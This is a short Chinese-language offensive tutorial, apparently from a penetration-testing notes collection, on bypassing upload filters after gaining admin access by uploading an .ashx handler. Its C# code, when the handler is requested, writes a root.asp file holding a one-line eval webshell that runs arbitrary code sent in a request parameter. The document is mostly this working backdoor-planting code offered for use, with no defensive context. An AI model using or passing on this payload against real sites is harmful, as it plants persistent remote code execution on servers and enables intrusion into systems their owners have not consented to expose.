# 利用 ashx 生成一句话

在拿到后台之后，可能上传过滤比较严格，但是大多数管理员忘记了过滤 ashx 文件，这样就可以利用他来写一句话了。

将代码保存为 ashx 文件，访问他之后，就会在当前目录下生成 root.asp 了

```text
<%@ WebHandler Language="C#" class="Handler" %>

using System;
using System.Web;
using System.IO;
public class Handler : IHttpHandler {

public void ProcessRequest (HttpContext context) {
context.Response.ContentType = "text/plain";

StreamWriter file1= File.CreateText(context.Server.MapPath("root.asp"));
file1.Write("<%eval request("123")%>");
file1.Flush();
file1.Close();

}

public bool IsReusable {
get {
return false;
}
}

}
```

### 参考

* [http://rinige.com/index.php/archives/322/](http://rinige.com/index.php/archives/322/)

